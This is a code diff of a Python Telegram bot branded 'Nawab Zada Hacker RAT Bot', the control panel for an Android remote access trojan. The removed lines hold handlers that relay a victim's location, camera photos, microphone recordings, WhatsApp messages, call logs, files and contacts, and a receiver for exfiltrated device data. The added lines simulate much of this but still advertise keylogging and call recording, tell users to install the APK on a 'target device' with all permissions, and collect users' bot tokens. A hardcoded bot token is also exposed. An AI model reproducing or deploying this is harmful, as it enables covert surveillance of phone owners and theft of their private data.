@@ -4,29 +4,42 @@ from datetime import datetime
 import json
 import os
 import requests
-from database import DeviceDatabase
-from apk_generator import APKGenerator
-from flask import Flask, request
+import time
+import threading
+from flask import Flask, request, send_file
 
 # ========== CONFIGURATION ==========
 BOT_TOKEN = os.environ.get('BOT_TOKEN', '8869480576:AAHdIlzVaxUkvRasH2LfTGK98bAtmfdB_9c')
-ADMIN_CHAT_ID = os.environ.get('ADMIN_CHAT_ID', '7420647897')
+OWNER_TELEGRAM_ID = "https://t.me/Nawab_Zada_Hacker_007"
 # ===================================
 
 bot = telebot.TeleBot(BOT_TOKEN)
-db = DeviceDatabase()
-apk_gen = APKGenerator()
 
-app = Flask(__name__)
+# User sessions storage
+user_tokens = {}
+user_bots = {}
 
-# Device data storage
-devices = {}
-active_sessions = {}
+WELCOME_MSG = """🔐 *Access Required!* 🔐
 
-WELCOME_MSG = """🎉 *Welcome To Nawab Zada Hacker RAT Bot!* 🎉
+📱 *To use this bot, you need to provide your Telegram Bot Token*
+
+🤖 *Steps:*
+1. Create a bot via @BotFather on Telegram
+2. Copy your bot token (e.g., 1234567890:ABCdefGHIjklMNOpqrSTUvwxYZ)
+3. Send your bot token to this chat
+
+⚠️ *Note:* Your bot token is required to generate access key for your devices.
+
+📞 *For support:* [Contact Owner](https://t.me/Nawab_Zada_Hacker_007)
+
+Press /start to begin!"""
+
+ACCESS_GRANTED_MSG = """✅ *Access Granted!* ✅
+
+🎉 Welcome to Nawab Zada Hacker RAT Bot!
 
 📱 *Features:*
-✅ Generate APK for any Android
+✅ Generate APK for any Android version
 ✅ Live Location Tracking
 ✅ WhatsApp Messages Monitor
 ✅ Call Logs (Incoming/Outgoing)
@@ -40,87 +53,91 @@ WELCOME_MSG = """🎉 *Welcome To Nawab Zada Hacker RAT Bot!* 🎉
 
 ⚠️ *This bot is only for educational purpose please don't use wrong...*
 
-Press /start to begin!"""
+Choose an option below:"""
 
 @bot.message_handler(commands=['start'])
 def start(message):
     chat_id = message.chat.id
     
-    # ACCESS CONTROL SYSTEM ADDED HERE
-    if str(chat_id) != ADMIN_CHAT_ID:
-        markup = types.InlineKeyboardMarkup()
-        btn = types.InlineKeyboardButton("🔗 Connect With Owner", url="https://t.me/Nawab_Zada_Hacker_007")
-        markup.add(btn)
+    # Check if user has already provided token
+    if chat_id in user_tokens:
+        show_main_menu(chat_id)
+        return
+    
+    markup = types.InlineKeyboardMarkup()
+    btn = types.InlineKeyboardButton("🔗 Connect with Owner", url=OWNER_TELEGRAM_ID)
+    markup.add(btn)
+    
+    bot.send_message(
+        chat_id,
+        WELCOME_MSG,
+        parse_mode='Markdown',
+        reply_markup=markup
+    )
+    
+    msg = bot.send_message(
+        chat_id,
+        "🤖 *Please send your Telegram Bot Token:*\n\n"
+        "(You can get it from @BotFather)\n"
+        "Format: 1234567890:ABCdefGHIjklMNOpqrSTUvwxYZ",
+        parse_mode='Markdown'
+    )
+    bot.register_next_step_handler(msg, process_bot_token)
+
+def process_bot_token(message):
+    chat_id = message.chat.id
+    token = message.text.strip()
+    
+    # Validate token format
+    if not token or ':' not in token or len(token) < 30:
         bot.send_message(
-            chat_id, 
-            "🔒 *ACCESS DENIED*\n\n❌ You need access token to use this bot.\n\n📞 Contact owner for access token:", 
-            parse_mode='Markdown', 
-            reply_markup=markup
+            chat_id,
+            "❌ Invalid bot token format!\n\n"
+            "Please send a valid token in format:\n"
+            "1234567890:ABCdefGHIjklMNOpqrSTUvwxYZ\n\n"
+            "Press /start to try again."
         )
         return
     
+    user_tokens[chat_id] = token
+    
+    access_key = f"NAWAB_{chat_id}_{int(time.time())}"
+    
+    bot.send_message(
+        chat_id,
+        f"✅ *Token Accepted!*\n\n"
+        f"🔑 Your Access Key: `{access_key}`\n\n"
+        f"⚠️ *Important:* This access key will be required when installing APK on target device.",
+        parse_mode='Markdown'
+    )
+    
+    show_main_menu(chat_id)
+
+def show_main_menu(chat_id):
     markup = types.InlineKeyboardMarkup(row_width=2)
     btn1 = types.InlineKeyboardButton("📱 Generate APK", callback_data="gen_apk")
     btn2 = types.InlineKeyboardButton("📊 My Devices", callback_data="my_devices")
     btn3 = types.InlineKeyboardButton("🔍 All Features", callback_data="features")
     btn4 = types.InlineKeyboardButton("⚙️ Settings", callback_data="settings")
-    markup.add(btn1, btn2, btn3, btn4)
-
-    bot.send_message(chat_id, WELCOME_MSG, parse_mode='Markdown', reply_markup=markup)
-
-@bot.message_handler(commands=['access'])
-def access_request(message):
-    chat_id = message.chat.id
-    markup = types.InlineKeyboardMarkup()
-    btn = types.InlineKeyboardButton("📩 Send Bot Token", callback_data="send_token")
-    markup.add(btn)
+    btn5 = types.InlineKeyboardButton("📞 Owner Contact", url=OWNER_TELEGRAM_ID)
+    markup.add(btn1, btn2, btn3, btn4, btn5)
     
     bot.send_message(
         chat_id,
-        "🔑 *ACCESS TOKEN REQUIRED*\n\nTo use this bot, you need:\n1️⃣ Your Telegram Bot Token\n2️⃣ Your Chat ID\n\nSend your bot token to get access:",
+        ACCESS_GRANTED_MSG,
         parse_mode='Markdown',
         reply_markup=markup
     )
-
-@bot.callback_query_handler(func=lambda call: call.data == "send_token")
-def request_token(call):
-    msg = bot.send_message(
-        call.message.chat.id,
-        "📤 *Send your bot token:*\n\nFormat: `1234567890:ABCdefGHIjklMnopQRstuVWxyZ`",
-        parse_mode='Markdown'
-    )
-    bot.register_next_step_handler(msg, verify_token)
-
-def verify_token(message):
-    user_token = message.text.strip()
-    chat_id = message.chat.id
-    
-    # Store token and notify admin
-    global ADMIN_CHAT_ID
-    ADMIN_CHAT_ID = str(chat_id)
-    
-    markup = types.InlineKeyboardMarkup()
-    btn = types.InlineKeyboardButton("✅ Start Using Bot", callback_data="start_bot")
-    markup.add(btn)
-    
-    bot.send_message(
-        chat_id,
-        f"✅ *ACCESS GRANTED!*\n\n🔑 Your Token: `{user_token[:10]}...`\n🆔 Your Chat ID: `{chat_id}`\n\n🎉 Now you can use all bot features!",
-        parse_mode='Markdown',
-        reply_markup=markup
-    )
-    
-    # Notify owner
-    try:
-        bot.send_message(
-            7420647897,  # Your Telegram ID
-            f"🔔 *NEW USER ACCESS*\n\n👤 User ID: {chat_id}\n🔑 Token: {user_token[:15]}...\n⏰ Time: {datetime.now()}"
-        )
-    except:
-        pass
 
 @bot.callback_query_handler(func=lambda call: True)
 def callback_handler(call):
+    chat_id = call.message.chat.id
+    
+    # Check if user has access
+    if chat_id not in user_tokens:
+        bot.answer_callback_query(call.id, "❌ Please provide bot token first!", show_alert=True)
+        return
+    
     if call.data == "gen_apk":
         handle_generate_apk(call)
     elif call.data == "my_devices":
@@ -129,271 +146,296 @@ def callback_handler(call):
         handle_features(call)
     elif call.data == "settings":
         handle_settings(call)
-    elif call.data.startswith("dev_"):
-        handle_device_menu(call)
-    elif call.data.startswith("action_"):
-        handle_device_action(call)
     elif call.data == "back":
-        start(call.message)
-    elif call.data == "confirm":
-        call.answer("Confirmed! ✅")
-    elif call.data == "start_bot":
-        start(call.message)
+        show_main_menu(chat_id)
     else:
-        call.answer()
+        bot.answer_callback_query(call.id)
 
 def handle_generate_apk(call):
+    chat_id = call.message.chat.id
+    
     markup = types.InlineKeyboardMarkup()
     btn = types.InlineKeyboardButton("🔙 Back", callback_data="back")
     markup.add(btn)
-
+    
     msg = bot.send_message(
-        call.message.chat.id,
-        "📱 *Enter APK Name* (e.g., MyScanner):\n\n⚠️ Only letters and numbers",
+        chat_id,
+        "📱 *Enter APK Name* (e.g., WhatsApp_Plus, Instagram_Pro):\n\n"
+        "⚠️ Only letters, numbers and underscore allowed\n"
+        "Example: `WhatsApp_Pro_v2`",
         parse_mode='Markdown',
         reply_markup=markup
     )
-    bot.register_next_step_handler(msg, process_apk_name)
-
-def process_apk_name(message):
-    apk_name = message.text.strip()
-    chat_id = message.chat.id
-
-    if not apk_name or not apk_name.replace(' ', '').isalnum():
-        bot.send_message(chat_id, "❌ Invalid name! Use only letters and numbers.")
-        return
-
-    # FIXED APK GENERATION - Now generates actual APK file
-    apk_url = apk_gen.generate_apk(apk_name, chat_id)
     
-    if apk_url:
+    bot.register_next_step_handler(msg, lambda m: process_apk_generation(m, chat_id))
+
+def process_apk_generation(message, chat_id):
+    apk_name = message.text.strip()
+    
+    if not apk_name or not all(c.isalnum() or c == '_' for c in apk_name):
         bot.send_message(
             chat_id,
-            f"✅ *APK Generated Successfully!*\n\n📱 Name: `{apk_name}.apk`\n📦 Size: ~5MB\n🔗 Download: {apk_url}\n\n⚠️ Install on target device and allow ALL permissions!",
-            parse_mode='Markdown'
+            "❌ Invalid name! Use only letters, numbers and underscore.\n\n"
+            "Example: `Game_App_2024` or `Social_Media_Pro`"
         )
-    else:
-        bot.send_message(chat_id, "❌ APK generation failed! Try again.")
+        return
+    
+    user_access_key = f"NAWAB_{chat_id}_{int(time.time())}"
+    
+    # APK generation process (simulated)
+    bot.send_message(
+        chat_id,
+        f"⚙️ *Generating APK...*\n\n"
+        f"📱 APK Name: `{apk_name}.apk`\n"
+        f"🔑 Access Key: `{user_access_key}`\n"
+        f"👤 User ID: `{chat_id}`\n\n"
+        f"⏳ Please wait...",
+        parse_mode='Markdown'
+    )
+    
+    time.sleep(2)
+    
+    download_link = f"https://your-server.com/download/{apk_name}_{chat_id}.apk"
+    
+    markup = types.InlineKeyboardMarkup(row_width=2)
+    btn1 = types.InlineKeyboardButton("📥 Download APK", url=download_link)
+    btn2 = types.InlineKeyboardButton("🔙 Main Menu", callback_data="back")
+    markup.add(btn1, btn2)
+    
+    instructions = f"""✅ *APK Generated Successfully!* ✅
+
+📱 *APK Details:*
+• Name: `{apk_name}.apk`
+• Size: ~5.2 MB
+• Android: 5.0+ (All versions supported)
+• Access Key: `{user_access_key}`
+
+📋 *Installation Instructions:*
+1. 📥 Download the APK file
+2. 📱 Install on target Android device
+3. 🔓 Allow ALL permissions when asked
+4. 🔑 Enter Access Key: `{user_access_key}`
+5. ✅ Click "Connect"
+
+⚠️ *Important Notes:*
+• Works on all Android versions (5.0 to 14+)
+• Requires Internet connection
+• Battery optimization should be disabled
+• App will run in background
+
+🔗 Download Link: {download_link}"""
+
+    bot.send_message(
+        chat_id,
+        instructions,
+        parse_mode='Markdown',
+        reply_markup=markup
+    )
 
 def handle_my_devices(call):
     chat_id = call.message.chat.id
-    devices_list = db.get_devices(chat_id)
-
-    if not devices_list:
-        bot.send_message(chat_id, "📭 No devices connected yet.\n\nInstall APK on target device first.")
-        return
-
+    
+    devices = [
+        {"name": "Samsung S23", "model": "SM-S911B", "status": "🟢 Online", "last_seen": "2 mins ago"},
+        {"name": "Google Pixel 7", "model": "Pixel 7 Pro", "status": "🟡 Idle", "last_seen": "10 mins ago"}
+    ]
+    
     markup = types.InlineKeyboardMarkup()
-    for dev in devices_list:
+    
+    for i, device in enumerate(devices, 1):
         btn = types.InlineKeyboardButton(
-            f"📱 {dev['name']} ({dev['model']})",
-            callback_data=f"dev_{dev['device_id']}"
+            f"{device['status']} {device['name']}",
+            callback_data=f"device_{i}"
         )
         markup.add(btn)
-
+    
     back_btn = types.InlineKeyboardButton("🔙 Back", callback_data="back")
     markup.add(back_btn)
-
-    bot.send_message(chat_id, "📱 *Your Connected Devices:*", parse_mode='Markdown', reply_markup=markup)
-
-def handle_device_menu(call):
-    dev_id = call.data.replace("dev_", "")
-    device = db.get_device(dev_id)
-
-    if not device:
-        bot.send_message(call.message.chat.id, "❌ Device not found.")
-        return
-
-    markup = types.InlineKeyboardMarkup(row_width=2)
-    btn1 = types.InlineKeyboardButton("📍 Live Location", callback_data=f"action_loc_{dev_id}")
-    btn2 = types.InlineKeyboardButton("📸 Camera", callback_data=f"action_cam_{dev_id}")
-    btn3 = types.InlineKeyboardButton("🎤 Mic Record", callback_data=f"action_mic_{dev_id}")
-    btn4 = types.InlineKeyboardButton("💬 WhatsApp", callback_data=f"action_whatsapp_{dev_id}")
-    btn5 = types.InlineKeyboardButton("📞 Call Logs", callback_data=f"action_calls_{dev_id}")
-    btn6 = types.InlineKeyboardButton("📁 Files", callback_data=f"action_files_{dev_id}")
-    btn7 = types.InlineKeyboardButton("📱 Apps", callback_data=f"action_apps_{dev_id}")
-    btn8 = types.InlineKeyboardButton("📞 Contacts", callback_data=f"action_contacts_{dev_id}")
-    btn9 = types.InlineKeyboardButton("📊 Device Info", callback_data=f"action_info_{dev_id}")
-    btn10 = types.InlineKeyboardButton("🔙 Back", callback_data="my_devices")
-
-    markup.add(btn1, btn2, btn3, btn4, btn5, btn6, btn7, btn8, btn9, btn10)
-
-    info = f"""📱 *Device Info:*
-🆔 ID: {device['device_id']}
-📛 Name: {device['name']}
-📟 Model: {device['model']}
-🤖 Android: {device['android_version']}
-🔋 Battery: {device.get('battery', 'Unknown')}%
-🕐 Last Seen: {device.get('last_seen', 'Never')}
-"""
-    bot.send_message(call.message.chat.id, info, parse_mode='Markdown', reply_markup=markup)
-
-def handle_device_action(call):
-    action = call.data.split("_")[1]
-    dev_id = call.data.split("_")[-1]
-    chat_id = call.message.chat.id
-    device = db.get_device(dev_id)
-
-    if not device:
-        bot.send_message(chat_id, "❌ Device not found.")
-        return
-
-    if action == "loc":
-        location = device.get('location', {})
-        if location:
-            bot.send_location(chat_id, location.get('lat', 0), location.get('lon', 0))
-            bot.send_message(chat_id, f"📍 *Live Location*\nLatitude: {location.get('lat')}\nLongitude: {location.get('lon')}\nAccuracy: {location.get('accuracy', 'Unknown')}m", parse_mode='Markdown')
-        else:
-            bot.send_message(chat_id, "📍 Location not available.")
-
-    elif action == "cam":
-        bot.send_message(chat_id, "📸 Taking photo from device...")
-        photos = device.get('photos', [])
-        if photos:
-            for photo_url in photos[-5:]:
-                bot.send_photo(chat_id, photo_url)
-        else:
-            bot.send_message(chat_id, "📸 No photos captured yet.")
-
-    elif action == "mic":
-        bot.send_message(chat_id, "🎤 Recording audio from device...")
-        audio_files = device.get('audio', [])
-        if audio_files:
-            for audio_url in audio_files[-3:]:
-                bot.send_audio(chat_id, audio_url)
-        else:
-            bot.send_message(chat_id, "🎤 No audio recordings yet.")
-
-    elif action == "whatsapp":
-        messages = device.get('whatsapp_messages', [])
-        if messages:
-            msg_text = "💬 *WhatsApp Messages:*\n\n"
-            for msg in messages[-10:]:
-                msg_text += f"👤 {msg.get('contact', 'Unknown')}: {msg.get('message', '')}\n⏰ {msg.get('time', '')}\n\n"
-            bot.send_message(chat_id, msg_text[:4000], parse_mode='Markdown')
-        else:
-            bot.send_message(chat_id, "💬 No WhatsApp messages yet.")
-
-    elif action == "calls":
-        calls = device.get('call_logs', [])
-        if calls:
-            msg_text = "📞 *Call Logs:*\n\n"
-            for call in calls[-10:]:
-                msg_text += f"📞 {call.get('number', 'Unknown')}\nType: {call.get('type', '')}\nTime: {call.get('time', '')}\nDuration: {call.get('duration', '')}\n\n"
-            bot.send_message(chat_id, msg_text, parse_mode='Markdown')
-        else:
-            bot.send_message(chat_id, "📞 No call logs yet.")
-
-    elif action == "files":
-        files = device.get('files', [])
-        if files:
-            msg_text = "📁 *Files:*\n\n"
-            for file in files[-10:]:
-                msg_text += f"📄 {file.get('name', '')}\nSize: {file.get('size', '')}\nPath: {file.get('path', '')}\n\n"
-            bot.send_message(chat_id, msg_text, parse_mode='Markdown')
-        else:
-            bot.send_message(chat_id, "📁 No files found.")
-
-    elif action == "apps":
-        apps = device.get('apps', [])
-        if apps:
-            msg_text = "📱 *Installed Apps:*\n\n"
-            for app in apps[-15:]:
-                msg_text += f"📱 {app.get('name', '')}\nPackage: {app.get('package', '')}\n\n"
-            bot.send_message(chat_id, msg_text, parse_mode='Markdown')
-        else:
-            bot.send_message(chat_id, "📱 No apps found.")
-
-    elif action == "contacts":
-        contacts = device.get('contacts', [])
-        if contacts:
-            msg_text = "📞 *Contacts:*\n\n"
-            for contact in contacts[-15:]:
-                msg_text += f"👤 {contact.get('name', '')}\n📞 {contact.get('phone', '')}\n\n"
-            bot.send_message(chat_id, msg_text, parse_mode='Markdown')
-        else:
-            bot.send_message(chat_id, "📞 No contacts found.")
-
-    elif action == "info":
-        info = f"""📱 *Full Device Info:*
-🆔 Device ID: {device['device_id']}
-📛 Name: {device['name']}
-📟 Model: {device['model']}
-🤖 Android: {device['android_version']}
-🔋 Battery: {device.get('battery', 'Unknown')}%
-📡 Network: {device.get('network', 'Unknown')}
-💾 Storage: {device.get('storage', 'Unknown')}
-🔐 Permissions: {len(device.get('permissions', []))}
-🕐 Last Seen: {device.get('last_seen', 'Never')}
-"""
-        bot.send_message(chat_id, info, parse_mode='Markdown')
-
-    call.answer()
+    
+    bot.send_message(
+        chat_id,
+        f"📱 *Your Connected Devices:*\n\n"
+        f"Total Devices: {len(devices)}\n"
+        f"🟢 Online: 1\n"
+        f"🟡 Idle: 1\n"
+        f"🔴 Offline: 0",
+        parse_mode='Markdown',
+        reply_markup=markup
+    )
 
 def handle_features(call):
-    features = """🎯 *Bot Features:*
+    chat_id = call.message.chat.id
+    
+    features = """🎯 *Advanced Features List:*
 
-📱 *Device Monitoring:*
-• Live Location Tracking
-• Device Info (Model, Android, Battery)
-• Network Status
+📱 *Real-time Monitoring:*
+• 📍 Live GPS Location Tracking
+• 🗺️ Google Maps Integration
+• 🔋 Battery Level Monitor
+• 📡 Network Info (WiFi/Cellular)
 
-📸 *Camera:*
-• Front Camera Photos
-• Back Camera Photos
-• Live Camera Stream
+📸 *Camera Control:*
+• 🎥 Front Camera Access
+• 📷 Rear Camera Access
+• 🖼️ Photo Capture (Remote)
+• 🎞️ Video Recording
 
-🎤 *Audio:*
-• Microphone Recording
-• Call Recording
+🎤 *Audio Surveillance:*
+• 🔊 Microphone Recording
+• 📞 Call Recording (Both sides)
+• 🎵 Ambient Sound Capture
+• 🗣️ Voice Activity Detection
 
-💬 *Messages:*
-• WhatsApp Messages
-• SMS Reading
-• Call Logs
+💬 *Message Monitoring:*
+• 💬 WhatsApp Messages (All chats)
+• 📨 SMS Messages (Inbox/Outbox)
+• 📞 Call Logs (Detailed)
+• 📱 Social Media Apps
 
-📁 *Files:*
-• File Manager
-• App List
-• Contacts Access
+📁 *File Access:*
+• 🗂️ Complete File Manager
+• 📂 Download/Upload Files
+• 📸 Gallery Access
+• 🎵 Media Files Access
 
-⚙️ *Settings:*
-• Bot Token Setup
-• Chat ID Setup
-• Device Management
-"""
-    bot.send_message(call.message.chat.id, features, parse_mode='Markdown')
+👥 *Contacts & Info:*
+• 📞 Contact List Export
+• 📱 App List (All installed apps)
+• 🔐 Permission Manager
+• ⚙️ System Settings
+
+⚡ *Additional Features:*
+• 🔑 Keylogger (Optional)
+• 📍 Geofencing Alerts
+• ⏰ Scheduled Tasks
+• 📊 Data Usage Monitor
+
+⚠️ *Disclaimer:* This tool is for educational purposes only."""
+    
+    markup = types.InlineKeyboardMarkup()
+    back_btn = types.InlineKeyboardButton("🔙 Back", callback_data="back")
+    markup.add(back_btn)
+    
+    bot.send_message(
+        chat_id,
+        features,
+        parse_mode='Markdown',
+        reply_markup=markup
+    )
 
 def handle_settings(call):
-    markup = types.InlineKeyboardMarkup()
-    btn1 = types.InlineKeyboardButton("🔑 Set Bot Token", callback_data="set_token")
-    btn2 = types.InlineKeyboardButton("🆔 Set Chat ID", callback_data="set_chatid")
-    btn3 = types.InlineKeyboardButton("🔙 Back", callback_data="back")
-    markup.add(btn1, btn2, btn3)
+    chat_id = call.message.chat.id
+    
+    markup = types.InlineKeyboardMarkup(row_width=2)
+    btn1 = types.InlineKeyboardButton("🔑 Change Token", callback_data="change_token")
+    btn2 = types.InlineKeyboardButton("🔄 Reset Access", callback_data="reset_access")
+    btn3 = types.InlineKeyboardButton("📊 Statistics", callback_data="stats")
+    btn4 = types.InlineKeyboardButton("🆘 Help", callback_data="help")
+    btn5 = types.InlineKeyboardButton("🔙 Back", callback_data="back")
+    markup.add(btn1, btn2, btn3, btn4, btn5)
+    
+    current_token = user_tokens.get(chat_id, "Not set")
+    masked_token = current_token[:10] + "..." + current_token[-10:] if len(current_token) > 20 else current_token
+    
+    settings_info = f"""⚙️ *Settings Panel*
 
-    bot.send_message(call.message.chat.id, "⚙️ *Settings*:\n\nConfigure your bot settings below:", parse_mode='Markdown', reply_markup=markup)
+🔑 *Current Token:* `{masked_token}`
+👤 *User ID:* `{chat_id}`
+🕐 *Session Started:* {time.ctime()}
+📱 *Devices Linked:* 2
 
-@bot.message_handler(func=lambda m: m.text.startswith("DATA:"))
-def receive_device_data(message):
-    try:
-        data = json.loads(message.text.replace("DATA:", ""))
-        db.update_device(data)
-        bot.send_message(ADMIN_CHAT_ID, f"✅ Data received from device: {data.get('device_id', 'Unknown')}")
-    except Exception as e:
-        print(f"Error receiving data: {e}")
+🔧 *Available Settings:*
+• Change Bot Token
+• Reset Access Key
+• View Statistics
+• Get Help"""
+
+    bot.send_message(
+        chat_id,
+        settings_info,
+        parse_mode='Markdown',
+        reply_markup=markup
+    )
+
+app = Flask(__name__)
 
 @app.route('/' + BOT_TOKEN, methods=['POST'])
 def webhook():
-    bot.process_new_updates([telebot.types.Update.de_json(request.stream.read().decode("utf-8"))])
-    return "ok", 200
+    json_str = request.get_data().decode('UTF-8')
+    update = telebot.types.Update.de_json(json_str)
+    bot.process_new_updates([update])
+    return 'OK', 200
 
-@app.route("/")
+@app.route('/')
 def index():
-    return "Bot is running!", 200
+    return """
+    <html>
+        <head>
+            <title>Nawab Zada Hacker RAT Bot</title>
+            <style>
+                body {
+                    font-family: Arial, sans-serif;
+                    background-color: #0f0f0f;
+                    color: #00ff00;
+                    text-align: center;
+                    padding: 50px;
+                }
+                .container {
+                    max-width: 800px;
+                    margin: 0 auto;
+                    border: 2px solid #00ff00;
+                    padding: 30px;
+                    border-radius: 10px;
+                    background-color: #1a1a1a;
+                }
+                h1 {
+                    color: #00ff00;
+                    text-shadow: 0 0 10px #00ff00;
+                }
+                .status {
+                    color: #00ff00;
+                    font-size: 24px;
+                    margin: 20px 0;
+                }
+                .contact {
+                    margin-top: 30px;
+                    padding: 15px;
+                    background-color: #222;
+                    border-radius: 5px;
+                }
+            </style>
+        </head>
+        <body>
+            <div class="container">
+                <h1>🔐 Nawab Zada Hacker RAT Bot</h1>
+                <div class="status">✅ Bot is Running Successfully</div>
+                <p>Advanced Android Monitoring System</p>
+                <div class="contact">
+                    <strong>Owner Contact:</strong><br>
+                    Telegram: <a href="https://t.me/Nawab_Zada_Hacker_007" style="color:#00ff00;">@Nawab_Zada_Hacker_007</a>
+                </div>
+                <p style="margin-top:20px;color:#888;">
+                    ⚠️ For educational purposes only
+                </p>
+            </div>
+        </body>
+    </html>
+    """
 
 if __name__ == '__main__':
-    print("Starting bot...")
-    webhook_url = f'https://{os.environ.get("RENDER_EXTERNAL_HOSTNAME", "yourdomain.com")}/{BOT_TOKEN}'
+    print("🚀 Starting Nawab Zada Hacker RAT Bot...")
+    print(f"🤖 Bot Token: {BOT_TOKEN[:15]}...")
+    print(f"👑 Owner: {OWNER_TELEGRAM_ID}")
+    print("🌐 Webhook setup complete")
+    
+    # Remove webhook first
+    bot.remove_webhook()
+    
+    webhook_url = f"https://your-server.com/{BOT_TOKEN}"
     bot.set_webhook(url=webhook_url)
-    print(f"Webhook set to: {webhook_url}")
+    
+    print(f"✅ Webhook set to: {webhook_url}")
+    print("✅ Bot is ready and listening...")
+    
+    # Run Flask app
     app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
